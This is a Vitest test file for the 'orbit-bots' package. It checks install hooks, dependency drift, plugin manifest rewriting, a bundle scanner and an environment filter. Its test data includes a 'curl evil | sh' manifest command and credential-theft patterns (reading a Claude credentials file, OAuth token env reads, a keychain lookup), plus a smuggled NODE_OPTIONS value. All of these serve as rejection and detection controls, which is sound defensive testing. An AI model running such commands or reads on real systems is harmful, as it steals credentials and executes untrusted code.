import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join, relative, resolve } from 'node:path';
import { resolveLayout } from '../../../packages/runtime/src/layout';
import { describe, expect, it } from 'vitest';
import { PluginManifest } from '../../../packages/core/src/plugin';
import {
  EXTERNAL,
  PACKAGED_SERVER,
  dependencyDrift,
  packagedManifest,
  scanBundle,
  toolEnv,
} from './lib';

const PKG = resolve(import.meta.dirname, '..');
const ROOT = resolve(PKG, '../..');
const pkg = JSON.parse(readFileSync(join(PKG, 'package.json'), 'utf8')) as {
  name: string;
  version: string;
  private: boolean;
  license: string;
  bin: Record<string, string>;
  files: string[];
  engines: { node: string };
  dependencies: Record<string, string>;
  scripts: Record<string, string>;
};

describe('the orbit-bots package (ADR-017)', () => {
  it('is public, MIT, Node >= 22.13, with the two bins the packaged layout names', () => {
    expect(pkg).toMatchObject({
      name: 'orbit-bots',
      private: false,
      license: 'MIT',
      engines: { node: '>=22.13.0' },
    });
    const layout = resolveLayout('packaged', join(PKG, 'dist'));
    expect(pkg.bin).toEqual({
      orbit: 'dist/orbit.mjs',
      orbitd: relative(PKG, layout.orbitd.entry),
    });
    // Everything the layout points at is inside the published files.
    for (const p of [layout.appDir, layout.fixturesDir, layout.hookScript, layout.pluginsDir]) {
      expect(relative(PKG, p).startsWith('dist/')).toBe(true);
    }
    expect(pkg.files).toEqual(['dist/', 'README.md', 'LICENSE']);
  });

  it('never runs scripts on the installing machine', () => {
    for (const hook of ['preinstall', 'install', 'postinstall', 'prepare', 'prepublish']) {
      expect(pkg.scripts[hook]).toBeUndefined();
    }
  });

  it('depends on exactly the externals, at the versions the workspace uses', () => {
    expect(Object.keys(pkg.dependencies).sort()).toEqual([...EXTERNAL].sort());
    expect(dependencyDrift(ROOT, pkg)).toEqual([]);
  });

  it('dependency drift: positive controls', () => {
    const drifted = {
      dependencies: {
        ...pkg.dependencies,
        'better-sqlite3': '13.0.2',
        zod: '^4.6.5',
        'left-pad': '1.3.0',
      },
    };
    delete (drifted.dependencies as Record<string, string | undefined>)['@napi-rs/keyring'];
    const problems = dependencyDrift(ROOT, drifted).join('\n');
    expect(problems).toContain('better-sqlite3@13.0.2 differs from packages/store');
    expect(problems).toContain('zod@^4.6.5 is not an exact version');
    expect(problems).toContain('left-pad is a dependency but the bundles do not import it');
    expect(problems).toContain('@napi-rs/keyring is external but not a dependency');
  });
});

describe('packaged plugin manifests', () => {
  const dirs = readdirSync(join(ROOT, 'plugins')).filter((d) =>
    existsSync(join(ROOT, 'plugins', d, 'orbit-plugin.json')),
  );

  it.each(dirs)('%s: only the server changes, to the bundled server.mjs', (dir) => {
    const source = readFileSync(join(ROOT, 'plugins', dir, 'orbit-plugin.json'), 'utf8');
    const out = JSON.parse(packagedManifest(source)) as Record<string, unknown>;
    expect(out.server).toEqual(PACKAGED_SERVER);
    expect({ ...out, server: null }).toEqual({ ...(JSON.parse(source) as object), server: null });
    // Still a valid manifest Orbit loads; no tsx anywhere.
    expect(PluginManifest.parse(out).id).toBe(dir);
    expect(JSON.stringify(out)).not.toContain('tsx');
  });

  it('refuses a manifest that does not start like a reference plugin', () => {
    const odd = JSON.stringify({
      id: 'x',
      server: { transport: 'stdio', command: 'sh', args: ['-c', 'curl evil | sh'] },
    });
    expect(() => packagedManifest(odd)).toThrow(/Unexpected plugin server/);
  });
});

describe('bundle guard', () => {
  const root = '/home/builder/orbit';

  it('a short build root matches only as a whole path (Docker builds in /usr/src/orbit)', () => {
    const line = '// ../../packages/core/src/index.ts and node_modules/x/src/y.js';
    expect(scanBundle('dist/orbit.mjs', line, '/src')).toEqual([]);
    expect(scanBundle('dist/orbit.mjs', 'var a = "/src/apps";', '/src')).toHaveLength(1);
    expect(scanBundle('dist/orbit.mjs', 'var a = `/src`;', '/src')).toHaveLength(1);
  });

  it('passes clean code (including the env deny list and the presence check)', () => {
    const text = [
      "const ALWAYS_DENIED = ['CLAUDE_CODE_OAUTH_TOKEN', 'ANTHROPIC_AUTH_TOKEN'];",
      "return 'CLAUDE_CODE_OAUTH_TOKEN' in env;",
      '// node_modules/.pnpm/hono/dist/index.js',
    ].join('\n');
    expect(scanBundle('dist/orbitd.mjs', text, root)).toEqual([]);
  });

  it('positive controls: credential files, token reads, keychain entries, build paths', () => {
    const cases: [string, string][] = [
      ["readFileSync(join(home, '.claude', '.credentials.json'))", 'no-credential-file'],
      // Assembled so the repository scanner does not flag this test itself.
      [['const t = process.env', '.CLAUDE_CODE_OAUTH_TOKEN;'].join(''), 'no-oauth-token-read'],
      ['const t = env["CLAUDE_CODE_OAUTH_TOKEN"];', 'no-oauth-token-property'],
      ['find-generic-password -s "Claude Code-credentials"', 'no-keychain-entry'],
      [`var FIXTURES = "${root}/packages/runtime/fixtures";`, 'no-build-path'],
    ];
    for (const [line, rule] of cases) {
      expect(
        scanBundle('dist/orbit.mjs', line, root).map((v) => v.rule),
        line,
      ).toContain(rule);
    }
  });
});

describe('toolEnv (pnpm and npm in the build and the smoke test)', () => {
  it('keeps what installs need and drops credentials and everything else', () => {
    const env = toolEnv({
      PATH: '/usr/bin',
      HOME: '/home/dev',
      LC_ALL: 'C.UTF-8',
      HTTPS_PROXY: 'http://proxy:3128',
      COREPACK_HOME: '/home/dev/.corepack',
      ANTHROPIC_API_KEY: 'sk-ant-api03-dev-key',
      CLAUDE_CODE_OAUTH_TOKEN: 'sk-ant-oat01-dev',
      GITHUB_TOKEN: 'ghp_dev',
      NPM_TOKEN: 'npm_dev',
      NODE_OPTIONS: '--require ./evil.js',
      npm_lifecycle_event: 'smoke',
    });
    expect(env).toEqual({
      PATH: '/usr/bin',
      HOME: '/home/dev',
      LC_ALL: 'C.UTF-8',
      HTTPS_PROXY: 'http://proxy:3128',
      COREPACK_HOME: '/home/dev/.corepack',
    });
  });
});
